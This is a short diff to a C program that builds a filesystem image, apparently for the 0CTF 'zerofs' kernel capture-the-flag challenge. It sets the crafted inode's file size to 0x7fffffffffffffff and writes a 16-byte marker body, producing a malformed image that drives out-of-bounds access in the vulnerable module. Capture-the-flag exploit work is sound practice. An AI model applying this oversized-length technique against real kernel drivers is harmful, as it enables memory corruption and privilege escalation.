@@ -118,12 +118,12 @@ int main(int argc, char *argv[])
 	int fd;
 	ssize_t ret;
 
-	char file_body[] = "Welcome to 0CTF";
+	char file_body[] = "AAAABBBBCCCCDDDD";
 	struct zerofs_inode file = {
 		.mode = S_IFREG,
 		.ino = VULNFILE_INO,
 		.dno = VULNFILE_BLKNO,
-		.file_size = sizeof(file_body),
+		.file_size = 0x7fffffffffffffff, // sizeof(file_body),
 	};
 	struct zerofs_dir_record record = {
 		.filename = "file",
@@ -155,7 +155,7 @@ int main(int argc, char *argv[])
 		if (write_dirent(fd, &record))
 			break;
 
-		if (write_block(fd, file_body, file.file_size))
+		if (write_block(fd, file_body, 16))
 			break;
 
 		ret = 0;
